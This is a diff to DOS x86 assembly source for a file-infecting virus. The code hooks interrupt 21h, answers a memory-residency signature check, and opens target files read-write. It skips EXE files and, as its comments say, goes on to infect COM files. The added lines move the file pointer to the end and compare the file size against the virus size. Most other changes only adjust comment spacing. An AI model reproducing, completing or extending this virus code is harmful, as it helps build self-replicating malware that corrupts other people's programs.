@@ -63,17 +63,17 @@ new_int21:
 goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in operand
 
 send_msg:
-     mov ax, 8b7bh     ; In Mem Signature
+     mov ax, 8b7bh    ; In Mem Signature
      iret
 
-infect:            ; DS:DX = ASCIIZ Filename pointer
+infect:               ; DS:DX = ASCIIZ Filename pointer
      mov ax, 3d02h
-     int 21h      ; Open file Using Handle, Read Write. OUT: AX = Handle
-     mov bx, ax   ; BX = File Handle
+     int 21h          ; Open file Using Handle, Read Write. OUT: AX = Handle
+     mov bx, ax       ; BX = File Handle
      push bx
      xor cx, cx
-     xor dx, dx    ; low order and high order = 0
-     mov ax, 4200h ; Move file pointer to begining of file
+     xor dx, dx       ; low order and high order = 0
+     mov ax, 4200h    ; Move file pointer to begining of file
      int 21h
      pop bx
      push bx          ; BX = File Handle
@@ -84,7 +84,16 @@ infect:            ; DS:DX = ASCIIZ Filename pointer
      cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
      je .abort_infection
 
-                 ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
+                      ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
+     mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
+     pop bx
+     push bx          ; BX = File Handle
+     xor cx, cx       ; CX = 0
+     xor dx, dx       ; DX = 0
+     int 21h          ; Calling int 21h
+     cmp ax, 65436-virus_size   ; I the file too big??
+     je .abort_infection
+     
 
 .abort_infection:
      ret
